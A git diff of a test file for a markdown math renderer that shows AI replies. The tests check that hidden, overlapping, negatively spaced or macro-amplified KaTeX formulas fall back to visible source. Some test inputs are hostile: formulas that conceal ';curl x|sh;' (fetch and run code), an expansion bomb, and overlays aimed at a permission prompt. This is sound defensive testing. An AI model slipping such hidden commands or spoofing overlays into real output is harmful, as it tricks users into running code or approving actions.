@@ -2,6 +2,7 @@ const { test } = require('node:test');
 const assert = require('node:assert/strict');
 const fs = require('node:fs');
 const path = require('node:path');
+const { githubActions } = require('../scripts/clipboard-policy.cjs');
 const { readingMarked } = require('../src/features/reading/markdown-escape.ts');
 const { allowReadingMath } = require('../src/features/reading/markdown-math-sanitize.ts');
 const { mayContainMath } = require('../src/features/reading/markdown-math.ts');
@@ -16,6 +17,7 @@ const sample = String.raw`\[
 这里 \(u^n\) 已知，\(u^{n+1}\) 要求解。`;
 const parse = source => readingMarked.parse(source);
 const count = (html, pattern) => [...html.matchAll(pattern)].length;
+const sourceCode = '<code class="reading-math-source">';
 
 test('the reported Codex reply renders one display and two inline formulas', () => {
   const html = parse(sample);
@@ -71,7 +73,7 @@ test('invalid formulas, including unknown or untrusted commands, fall back to co
   const invalid = [String.raw`\(\frac{x}\)`, String.raw`$\unknown{x}$`, String.raw`$\htmlStyle{position:fixed}{x}$`];
   for (const source of invalid) {
     const html = parse(source);
-    assert.ok(html.includes('<code>' + source + '</code>'), source);
+    assert.ok(html.includes(sourceCode + source + '</code>'), source);
     assert.doesNotMatch(html, /class="katex"/);
   }
 });
@@ -137,24 +139,23 @@ test('message copy and quote retain the LaTeX source even when the formula is se
 test('oversized, hidden, overlapping, negatively spaced and custom-painted formulas show source', () => {
   const formulas = [
     String.raw`\smash{\raisebox{-1000em}{\colorbox{white}{FAKE}}}`, String.raw`\raisebox{-1000em}{x}`, String.raw`\rule[-1000em]{1em}{1em}`,
-    String.raw`\kern{-1000em}x`, String.raw`\hspace{-500em}x`, String.raw`\mkern-9000mu x`, String.raw`\hspace{-.1em}x`,
+    String.raw`\kern{-1000em}x`, String.raw`\hspace{-500em}x`, String.raw`\mkern-9000mu x`,
     String.raw`\text{visible}\phantom{hidden}`, String.raw`\hphantom{x}`, String.raw`\vphantom{x}`, String.raw`\smash{x}`,
-    String.raw`\llap{x}`, String.raw`\rlap{x}`, String.raw`\mathllap{x}`, String.raw`\mathrlap{x}`, String.raw`\mathclap{x}`,
+    String.raw`\llap{x}`, String.raw`\rlap{x}`, String.raw`\mathllap{xy}`, String.raw`\mathrlap{xy}`, String.raw`\mathclap{xy}`,
+    String.raw`\mathllap{\text{hidden text}}`, String.raw`\rlap{\text{long hidden text}}`,
     String.raw`\color{transparent}x`, String.raw`\textcolor{rgba(0,0,0,0)}{x}`, String.raw`\colorbox{white}{x}`,
     String.raw`\def\hide{\phantom{x}}\hide`, String.raw`\def\space{\mkern-2mu}\space x`,
   ];
-  for (const formula of formulas) assert.ok(parse('$' + formula + '$').includes('<code>$' + formula + '$</code>'), formula);
+  for (const formula of formulas) assert.ok(parse('$' + formula + '$').includes(sourceCode + '$' + formula + '$</code>'), formula);
   assert.match(parse(String.raw`$\sqrt{x}+\frac{1}{2}$`), /class="katex"/);
 });
 
-test('macro definitions stay visible and the amplification payload returns in under 50 ms', t => {
+test('macro definitions stay visible and the amplification payload never enters KaTeX', async t => {
+  const { default: katex } = await import('katex');
+  const inspect = t.mock.method(katex, '__parse', () => { throw new Error('Unexpected KaTeX parse'); });
+  const render = t.mock.method(katex, 'renderToString', () => { throw new Error('Unexpected KaTeX render'); });
   const source = '$' + String.raw`\def\b{` + 'x'.repeat(500) + String.raw`}\def\a{` + String.raw`\b`.repeat(400) + String.raw`}\a$`;
-  const start = performance.now();
-  const rendered = parse(source);
-  const elapsed = performance.now() - start;
-  t.diagnostic('Macro amplification fallback: ' + elapsed.toFixed(2) + ' ms.');
-  assert.ok(elapsed < 50, 'elapsed: ' + elapsed);
-  assert.ok(rendered.includes('<code>' + source + '</code>'));
+  assert.ok(parse(source).includes(sourceCode + source + '</code>'));
 
   const definitions = [
     String.raw`\def\a{x}`, String.raw`\gdef\a{x}`, String.raw`\edef\a{x}`, String.raw`\xdef\a{x}`,
@@ -163,8 +164,10 @@ test('macro definitions stay visible and the amplification payload returns in un
   ];
   for (const definition of definitions) {
     const formula = '$' + definition + ' + 1$';
-    assert.ok(parse(formula).includes('<code>' + formula + '</code>'), definition);
+    assert.ok(parse(formula).includes(sourceCode + formula + '</code>'), definition);
   }
+  assert.equal(inspect.mock.callCount(), 0);
+  assert.equal(render.mock.callCount(), 0);
 });
 
 test('the tree ceiling stops rendering and both KaTeX calls have a small expansion budget', async t => {
@@ -178,7 +181,7 @@ test('the tree ceiling stops rendering and both KaTeX calls have a small expansi
     return inspect(text, options);
   });
   const renderMock = t.mock.method(katex, 'renderToString', render);
-  assert.match(parse('$s_{472918}$'), /<code>\$s_\{472918\}\$<\/code>/);
+  assert.ok(parse('$s_{472918}$').includes(sourceCode + '$s_{472918}$</code>'));
   assert.equal(renderMock.mock.callCount(), 0);
   assert.match(parse('$s_{472919}$'), /class="katex"/);
   for (const { arguments: [, options] } of [...inspectMock.mock.calls, ...renderMock.mock.calls]) {
@@ -196,7 +199,7 @@ test('comments and alternate style branches show everything Copy and Quote would
     String.raw`$\html@mathml{\text{ls}}{;curl x|sh;}$`,
     String.raw`$\@firstoftwo{\text{ls}}{;curl x|sh;}$`,
   ];
-  for (const source of hidden) assert.ok(parse(source).includes('<code>' + source + '</code>'), source);
+  for (const source of hidden) assert.ok(parse(source).includes(sourceCode + source + '</code>'), source);
   for (const source of [String.raw`$\text{100\%}$`, String.raw`$\verb|100%|$`, String.raw`$a\pmod{n}$`]) assert.match(parse(source), /class="katex"/);
 });
 
@@ -206,17 +209,27 @@ test('summed positive kerns and spaces fall back before they can push text out o
     [String.raw`\mkern18mu `, 21], [String.raw`\kern9em `, 3], ['~', 65],
   ]) {
     const source = '$' + command.repeat(count) + 'x$';
-    assert.ok(parse(source).includes('<code>' + source + '</code>'), command);
+    assert.ok(parse(source).includes(sourceCode + source + '</code>'), command);
   }
   assert.match(parse(String.raw`$a\kern9em\kern9em\quad b$`), /class="katex"/);
 });
 
+test('negation overlays and normal spacing render within a separate negative kern budget', () => {
+  for (const formula of [
+    String.raw`a \neq b`, String.raw`a \ne b`, String.raw`\not=`, String.raw`x \notin S`, String.raw`A \not\subset B`,
+    String.raw`f\colon X \to Y`, String.raw`a\coloneqq b`, String.raw`\int\!\!\!\int`, String.raw`n!\,/\,k!`,
+    String.raw`a\hspace{-.1em}b`, String.raw`a\kern{-1em}b`, String.raw`\mathllap{x}y`,
+  ]) assert.match(parse('$' + formula + '$'), /class="katex"/, formula);
+  const source = '$a' + String.raw`\kern{-.1em}`.repeat(11) + String.raw`\kern{2em}b$`;
+  assert.ok(parse(source).includes(sourceCode + source + '</code>'));
+});
+
 test('limits formula source bytes and the count and HTML bytes of each reply', () => {
   const unicode = '$' + String.raw`\text{` + '汉'.repeat(700) + '}$';
-  assert.ok(parse(unicode).includes('<code>' + unicode + '</code>'));
+  assert.ok(parse(unicode).includes(sourceCode + unicode + '</code>'));
   const many = '$x$ '.repeat(301);
   assert.equal(count(parse(many), /class="katex"/g), 300);
-  assert.equal(count(parse(many), /<code>\$x\$<\/code>/g), 1);
+  assert.ok(parse(many).endsWith(sourceCode + '$x$</code> </p>\n'));
   assert.match(parse('$x$'), /class="katex"/);
 
   const large = '$' + 'x+'.repeat(400) + '1$';
@@ -225,7 +238,7 @@ test('limits formula source bytes and the count and HTML bytes of each reply', (
   assert.ok(fits > 0 && fits < 300);
   const html = parse((large + '\n\n').repeat(fits + 2));
   assert.equal(count(html, /class="katex"/g), fits);
-  assert.equal(count(html, /<code>/g), 2);
+  assert.equal(count(html, /<code class="reading-math-source">/g), 2);
 });
 
 test('the LRU reuses streamed formulas, separates display mode and evicts old entries', async t => {
@@ -246,20 +259,12 @@ test('the LRU reuses streamed formulas, separates display mode and evicts old en
   assert.deepEqual(calls.at(-1), [formula, false]);
 });
 
-test('dense formulas and escaped dollar preflight scale with input size', t => {
-  const measure = work => Math.min(...Array.from({ length: 3 }, () => {
-    const start = performance.now();
-    work();
-    return performance.now() - start;
-  }));
-  parse('word $x$ '.repeat(300));
-  const small = measure(() => parse('word $x$ '.repeat(2000)));
-  const large = measure(() => parse('word $x$ '.repeat(8000)));
+test('dense formulas preserve all source beyond the reply budget and escaped dollars bypass preflight', () => {
+  const html = parse('word $x$ '.repeat(8000));
+  assert.equal(count(html, /class="katex"/g), 300);
+  assert.equal(count(html, /<code class="reading-math-source">/g), 7700);
   const escaped = '$' + String.raw`\$`.repeat(50000);
-  const preflight = measure(() => assert.equal(mayContainMath(escaped), false));
-  t.diagnostic('2k / 8k formulas: ' + small.toFixed(1) + ' / ' + large.toFixed(1) + ' ms. Escaped dollars: ' + preflight.toFixed(1) + ' ms.');
-  assert.ok(large < Math.max(small * 9, 200));
-  assert.ok(preflight < 250);
+  assert.equal(mayContainMath(escaped), false);
 });
 
 test('Vite keeps every KaTeX font as a local WOFF2 and leaves other assets on the default policy', async () => {
@@ -281,7 +286,10 @@ const browserPath = [
   '/usr/bin/chromium', '/usr/bin/google-chrome', '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome',
 ].find(filename => filename && fs.existsSync(filename));
 
-test('Chromium keeps XML-like formula source through DOMPurify and clips reply paint', { skip: !browserPath, timeout: 30000 }, async t => {
+test('Chromium keeps XML-like formula source through DOMPurify and clips reply paint', {
+  skip: !githubActions(process.env) ? 'Browser tests run only in GitHub Actions.' : !browserPath,
+  timeout: 30000,
+}, async t => {
   const { chromium } = require('playwright-core');
   const ts = require('typescript');
   let browser;
@@ -294,7 +302,7 @@ test('Chromium keeps XML-like formula source through DOMPurify and clips reply p
   t.after(() => browser.close());
   const page = await browser.newPage();
   const root = path.resolve(__dirname, '..');
-  const files = ['Markdown.tsx', 'markdown-math-sanitize.ts', 'message-menu.ts'];
+  const files = ['Markdown.tsx', 'markdown-math-sanitize.ts', 'message-menu.ts', 'reading-paths.ts', 'reply-links.ts', '../terminal/terminal-links.ts'];
   const modules = Object.fromEntries(files.map(file => {
     const source = fs.readFileSync(path.join(root, 'src/features/reading', file), 'utf8');
     const compilerOptions = { module: ts.ModuleKind.CommonJS, jsx: ts.JsxEmit.ReactJSX, target: ts.ScriptTarget.ES2022 };
@@ -306,19 +314,22 @@ test('Chromium keeps XML-like formula source through DOMPurify and clips reply p
   await page.addScriptTag({ path: path.join(root, 'node_modules/dompurify/dist/purify.js') });
   await page.addStyleTag({ path: require.resolve('katex/dist/katex.min.css') });
   await page.addStyleTag({ path: path.join(root, 'src/features/reading/reading.css') });
-  const result = await browserMathFixture(page, modules, rendered, wideMath);
+  const paths = parse('$\\unknown{src/main.ts}$ and ' + '\x60src/main.ts\x60');
+  const result = await browserMathFixture(page, modules, rendered, wideMath, paths);
   assert.deepEqual(result.copied, sources);
   assert.equal(result.renderedMath, sources.length);
   assert.equal(result.containment, 'paint');
   assert.equal(result.hit, 'permission');
   assert.deepEqual(result.scrolls, [true, true]);
+  assert.deepEqual(result.linkedPaths, [false, true]);
 });
 
-function browserMathFixture(page, modules, rendered, wideMath) {
-  return page.evaluate(({ modules, rendered, wideMath }) => {
+function browserMathFixture(page, modules, rendered, wideMath, paths) {
+  return page.evaluate(({ modules, rendered, wideMath, paths }) => {
     const exports = new Map();
     const load = name => {
       if (name === 'dompurify') return { default: window.DOMPurify };
+      if (name === '../../shared/i18n') return { t: text => text };
       const file = name.replace(/^\.\//, '');
       if (!modules[file]) return {};
       if (!exports.has(file)) {
@@ -330,6 +341,11 @@ function browserMathFixture(page, modules, rendered, wideMath) {
     };
     const { sanitizeReadingHtml } = load('Markdown.tsx');
     const { selectedWithin } = load('message-menu.ts');
+    const { markReadingPaths } = load('reading-paths.ts');
+    const pathFixture = document.createElement('div');
+    pathFixture.innerHTML = sanitizeReadingHtml(paths);
+    markReadingPaths(pathFixture);
+    const linkedPaths = [...pathFixture.querySelectorAll('code')].map(node => !!node.querySelector('[data-reading-path]'));
     const reply = document.createElement('div');
     reply.className = 'reading-markdown';
     reply.style.width = '160px';
@@ -351,6 +367,6 @@ function browserMathFixture(page, modules, rendered, wideMath) {
     const permission = document.getElementById('permission').getBoundingClientRect();
     const hit = document.elementFromPoint(permission.left + 1, permission.top + 1).id;
     const scrolls = [...reply.querySelectorAll('.reading-math-display, pre')].map(node => node.scrollWidth > node.clientWidth);
-    return { copied, renderedMath, containment: getComputedStyle(reply).contain, hit, scrolls };
-  }, { modules, rendered, wideMath });
+    return { copied, renderedMath, containment: getComputedStyle(reply).contain, hit, scrolls, linkedPaths };
+  }, { modules, rendered, wideMath, paths });
 }
